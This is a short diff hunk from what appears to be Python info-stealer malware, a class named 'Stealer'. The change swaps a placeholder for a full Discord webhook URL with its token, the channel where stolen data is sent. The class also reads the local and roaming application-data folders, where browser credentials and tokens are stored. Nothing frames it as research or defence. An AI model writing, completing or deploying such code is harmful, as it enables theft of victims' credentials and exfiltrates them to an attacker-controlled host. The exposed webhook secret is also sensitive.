@@ -16,7 +16,7 @@ def generate_header(token=None, content_type="application/json"):
 
 class Stealer():
     def __init__(self):
-        self.webhook = "PUT WEBHOOK HERE"
+        self.webhook = "https://discord.com/api/webhooks/1396967872047218838/74g8SoBdBiHIWfw-kHnH2bOXyoRfO8lIToSYTdamg9xBbLED8caaQ-xMxeUk7OFg6bf-"
         self.name = "Stealer"
         self.appdata = os.getenv("LOCALAPPDATA")
         self.roaming = os.getenv("APPDATA")
